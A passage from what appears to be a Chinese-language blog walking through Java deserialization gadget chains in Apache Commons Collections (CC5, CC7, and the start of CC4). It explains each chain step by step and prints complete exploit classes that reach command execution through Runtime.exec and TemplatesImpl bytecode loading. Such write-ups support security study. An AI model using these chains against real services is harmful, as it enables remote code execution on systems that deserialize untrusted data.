class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC5</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, InstantiationException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br>        Transformer[] transformers=&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br>       <span class="hljs-comment">// lazymap.get(1);</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap,<span class="hljs-string">&quot;key&quot;</span>);<br>        tiedMapEntry.toString();<br>        Class&lt;BadAttributeValueExpException&gt; c4 =BadAttributeValueExpException.class;<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bad</span> <span class="hljs-operator">=</span> c4.newInstance();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> c4.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(bad,tiedMapEntry);<span class="hljs-comment">//BadAttributeValueExpException它可序列化</span><br>        serialize(bad);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span> <span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span> <span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><h2 id="一-分析-1"><a href="#一-分析-1" class="headerlink" title="一.分析"></a>一.分析</h2><blockquote><p>流程：HashTable.readObject—&gt;reconstitutionPut—&gt;(LazyMap的父类)AbstractMapDecorator.equals—&gt;(HashMap的父类)AbstractMap.equals—-&gt;LazyMap.get()</p></blockquote><h3 id="AbstractMap"><a href="#AbstractMap" class="headerlink" title="&lt;1.0&gt;AbstractMap!!!!!"></a>&lt;1.0&gt;AbstractMap!!!!!</h3><p>AbstractMap.equals后面可以调lazyMap.get</p><ul><li><p>AbstractMap是个抽象类不能直接实例化传参与前面相连，所以注意就要从它的子类下手</p></li><li><p>还要注意看下面这儿的<strong>m</strong>是调equals方法时的参数o，它想要是LazyMap(连上后面)，那就要注意找到前部分利用类后，调equals时一定传LazyMap</p><p><img src="/2025/05/13/CC5_CC7/image-20250511235355271-174705185510611.png" alt="image-20250511235355271"></p></li></ul><h3 id="HashTable-readObject入口"><a href="#HashTable-readObject入口" class="headerlink" title="&lt;1.1&gt;HashTable.readObject入口"></a>&lt;1.1&gt;HashTable.readObject入口</h3><p>接着从入口类看吧</p><p>在for循环中调用reconstitutionPut()来绑定key  value到table</p><ul><li>参数table是new的一个Entry。     key,value反序列化读取的，那么writeObject中肯定就会有序列化</li></ul><p><img src="/2025/05/13/CC5_CC7/image-20250511141956349-174705184864310.png" alt="image-20250511141956349"></p><p><img src="/2025/05/13/CC5_CC7/image-20250511161851440-17470518459149.png" alt="image-20250511161851440"></p><p>所以key ，value就是由HashTable  put添加的</p><hr><h3 id="reconstitutionPut"><a href="#reconstitutionPut" class="headerlink" title="&lt;1.2&gt;reconstitutionPut:"></a>&lt;1.2&gt;reconstitutionPut:</h3><ul><li><p>tab(一个新建的Entry)中为空进不了for循环就触发不了equals, 没进循环就会绑定key   value到tab中</p></li><li><p>根据上面&lt;1.0&gt;分析AbstractMap，reconstitutionPut中equals(key)   <strong>key必须为LazyMap</strong></p><p>刚刚也说reconstitutionPut(Table,key,value) 中 key是put添加的，故HashTable要put LazyMap   还得put两次，才能进for循环</p></li></ul><p><img src="/2025/05/13/CC5_CC7/image-20250511134843150-17469440987012.png" alt="image-20250511134843150"></p><hr><h3 id="从前面连接到AbstractMap"><a href="#从前面连接到AbstractMap" class="headerlink" title="&lt;1.3&gt;从前面连接到AbstractMap!!!!!"></a>&lt;1.3&gt;从前面连接到AbstractMap!!!!!</h3><p>现在已经分析了入口类和调get方法的AbstractMap.equals</p><p>现在问题就是看前面怎么调AbstractMap呢</p><p><img src="/2025/05/13/CC5_CC7/image-20250511142133932-17469773497465.png" alt="image-20250511142133932"></p><p>由于AbstractMap后面连接lazyMap的需求，我们put时传了LazyMap，很巧合的事情就发生了，</p><p>e.key会调equals,(e是一个Entry,序列化之后的key,value被绑定到的table) 。也就是说还是put添加的LazyMap调用了equals。</p><p><img src="/2025/05/13/CC5_CC7/image-20250511214940286-17469773421724.png" alt="image-20250511214940286"></p><p>而LazyMap没有equals方法，找它父类AbstractMapDecorator ,里面又调了map.equals方法</p><p>map是在LazyMap构造器里面传的HashMap,它也没有equals方法，！它父类就是AbstractMap。</p><p>到这儿就能触发lazymap.get了</p><p><img src="/2025/05/13/CC5_CC7/image-20250511232959404-17470518344968.png" alt="image-20250511232959404"></p><p><img src="/2025/05/13/CC5_CC7/image-20250511233503343-17470518320637.png" alt="image-20250511233503343"></p><p>所以是为了连接后面LazyMap,传参lazyMap，没想到恰好HashTable.reconstutitionPut中e.key，key是一样的类型</p><p>(不能通过new它的对象，传进别的类中来调它，就往别的类中传它的子类    实现间接调它)</p><h2 id="二-注意的问题"><a href="#二-注意的问题" class="headerlink" title="二.注意的问题"></a>二.注意的问题</h2><h3 id="put引发的两个问题"><a href="#put引发的两个问题" class="headerlink" title="&lt;2.1&gt;put引发的两个问题"></a>&lt;2.1&gt;put引发的两个问题</h3><p>1.和CC6一样，会提前消耗LazyMap.equals,所以要先把后面断开</p><p>（这里还与reconstitutionPut相似，第一次put的时候，entry为空没有触发equals，第二次put的时候才提前触发）</p><p><img src="/2025/05/13/CC5_CC7/image-20250512201018109-174712517701417.png" alt="image-20250512201018109"></p><p>2 .既然put提前触发了后面调LazyMap.get，那也就和CC6一样还有同样的问题,在LayMap.get方法里面会添加一个key，yy&#x3D;&#x3D;yy导致真正反序列化的时候并不会触发后面transformer方法了，所以就需要remove了</p><ul><li>具体分析：put     lazyMap2时提前触发lazyMap1.equals(lazymap2),——-&gt;跳到AbstractMap.equals中调lazyMap2.get(key)     key是lazyMap1的key yy</li></ul><p><img src="/2025/05/13/CC5_CC7/image-20250513150426635-174712518101418.png" alt="image-20250513150426635"></p><h3 id="reconstitutionPut中触发equals"><a href="#reconstitutionPut中触发equals" class="headerlink" title="&lt;2.2&gt;reconstitutionPut中触发equals"></a>&lt;2.2&gt;reconstitutionPut中触发equals</h3><p>外面的<strong>for循环第二次</strong>调用reconstitutionPut时会进入for循环，为了不让&amp;&amp;短路，触发equals，要满足</p><p><code>e.hash==hash</code></p><ul><li><p>分析一下：  </p><p>此时tab中只有lazyMap1 ,会进入for循环遍历，将lazyMap1的hash与当前读取到的key的hash比较</p></li><li><p>那么也表明需要put两个元素，且他们的hash相同</p></li><li><p>key.hashCode()计算LazyMap的key.hashCode</p><p>我们人为设置两个LazyMap的key.hashCode相同     即yy.hashCode&#x3D;&#x3D;zZ.hashCode</p><p>在第一次调reconstitutionPut时，tab为空没进for循环，将lazyMap1绑定到索引为index的tab中</p><p>等到第二次调reconstitutionPut时，由于索引index计算与hash(即key.hashCode)有关，我们也使得这两次算出的hash相等了，for循环就从刚绑定的lazymap1开始遍历且只遍历一次，</p><p>if中比较e.hash&#x3D;&#x3D;hash为True</p></li></ul><p><img src="/2025/05/13/CC5_CC7/image-20250511221804156-17470518292306-174705874277215.png" alt="image-20250511221804156"></p><p><img src="/2025/05/13/CC5_CC7/image-20250513154703527-174712518509119.png" alt="image-20250513154703527"></p><h2 id="三-最终exp"><a href="#三-最终exp" class="headerlink" title="三.最终exp"></a>三.最终exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.AbstractMapDecorator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.AbstractMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC7</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">hashMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">hashMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);<br>        lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);<br>        lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br><br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(lazyMap1, <span class="hljs-number">1</span>);<br>        hashtable.put(lazyMap2, <span class="hljs-number">1</span>);<br>        lazyMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br><br>        Class&lt;ChainedTransformer&gt; chainedTransformerClass = ChainedTransformer.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">iTransformers</span> <span class="hljs-operator">=</span> chainedTransformerClass.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformers.setAccessible(<span class="hljs-literal">true</span>);<br>        iTransformers.set(chainedTransformer, transformers);<br><br><br>        serialize(hashtable);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CC4 &amp;&amp; CC2</title>
    <link href="/2025/05/13/CC4_CC2/"/>
    <url>/2025/05/13/CC4_CC2/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><p><img src="/2025/05/13/CC4_CC2/image-20250430083036685-174597305713913.png" alt="image-20250430083036685"></p><h2 id="一-环境分析"><a href="#一-环境分析" class="headerlink" title="一.环境分析"></a>一.环境分析</h2><h3 id="添加依赖"><a href="#添加依赖" class="headerlink" title="&lt;1.1&gt;添加依赖"></a>&lt;1.1&gt;添加依赖</h3><pre><code class="hljs">    &lt;dependency&gt;        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;        &lt;version&gt;4.0&lt;/version&gt;    &lt;/dependency&gt;</code></pre><p>IDEA自动加载</p><p><img src="/2025/05/13/CC4_CC2/image-20250429104050798-17458948064461-17459159557659.png" alt="image-20250429104050798"></p><h3 id="不同于CC3"><a href="#不同于CC3" class="headerlink" title="&lt;1.2&gt;不同于CC3"></a>&lt;1.2&gt;不同于CC3</h3><p>CC4介绍：</p><ul><li>CC4中不是像之前学的用LazyMap或TransformedMap调transform方法，变成了TransformingComparator.compare.(.transform),CC4后面也是用的CC3加载类代码执行(InstantiateTransformer,TrAXFilter,TemplatesImpl)</li></ul><p>commons-collections3中TransformingComparator没有继承Serializable,commons-collections4中才继承</p><h2 id="二-分析过程"><a href="#二-分析过程" class="headerlink" title="二.分析过程"></a>二.分析过程</h2><h3 id="尾部"><a href="#尾部" class="headerlink" title="&lt;2.1&gt;尾部"></a>&lt;2.1&gt;尾部</h3><p>和CC3一样加载类执行代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-comment">//尾部代码执行</span><br>       <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>       Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br>       <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>       name.setAccessible(<span class="hljs-literal">true</span>);<br>       name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>       <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>       tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>       tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>       <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>       bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>       <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br>       <span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>       bytecodes.set(templates,codes);<br>       <span class="hljs-comment">//templates.newTransformer();</span><br>       InstantiateTransformer&lt;Object&gt; instantiateTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>       Transformer[] transformers=&#123;<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>               instantiateTransformer<br>       &#125;;<br>       <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br><br>    <span class="hljs-comment">//   chainedTransformer.transform(1);</span><br></code></pre></td></tr></table></figure><h3 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="&lt;2.2&gt;TransformingComparator"></a>&lt;2.2&gt;TransformingComparator</h3><blockquote><p>找到TransformingComparator.compare**.transform**</p></blockquote><p>直接构造器里面传chainedTransformer</p><p><img src="/2025/05/13/CC4_CC2/image-20250429144251555-17459159456347.png" alt="image-20250429144251555"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">   <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);<br><span class="hljs-comment">//   transformingComparator.compare(1,2);</span><br></code></pre></td></tr></table></figure><h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="&lt;2.3&gt;PriorityQueue"></a>&lt;2.3&gt;PriorityQueue</h3><blockquote><p>找到PriorityQueue.readObject.heapify.siftDown.siftDownUsingComparator**.compare**</p></blockquote><p>从入口类PriorityQueue中(一直在这个类)走到TransformingComparator.compare(.get)</p><p>刚好comparator，TransformingComparator是相同类型，直接构造器传参即可</p><p><img src="/2025/05/13/CC4_CC2/image-20250429153412445-17459159423076.png" alt="image-20250429153412445"></p><p><img src="/2025/05/13/CC4_CC2/image-20250429153441860-17459159398945.png" alt="image-20250429153441860"></p><p><img src="/2025/05/13/CC4_CC2/image-20250429153524495-17459159366924.png" alt="image-20250429153524495"></p><p><img src="/2025/05/13/CC4_CC2/image-20250429153558394-17459159337693.png" alt="image-20250429153558394"></p><h2 id="三-构造exp"><a href="#三-构造exp" class="headerlink" title="三.构造exp"></a>三.构造exp</h2><h3 id="构造"><a href="#构造" class="headerlink" title="&lt;3.1&gt;构造"></a>&lt;3.1&gt;构造</h3><p>现在构造如下，但是什么也没发生，也没有报错</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//尾部代码执行</span><br>     <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>     Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>     name.setAccessible(<span class="hljs-literal">true</span>);<br>     name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>     tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>     tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>     bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>     <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br>     <span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>     bytecodes.set(templates,codes);<br>     <span class="hljs-comment">//templates.newTransformer();</span><br>     InstantiateTransformer&lt;Object&gt; instantiateTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>     Transformer[] transformers=&#123;<br>             <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>             instantiateTransformer<br>     &#125;;<br>     <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br><br>     <span class="hljs-comment">//chainedTransformer.transform(1);</span><br><br>     <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);<br>    <span class="hljs-comment">// transformingComparator.compare(1,2);</span><br>     <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>     serialize(priorityQueue);<br>     unserialize(<span 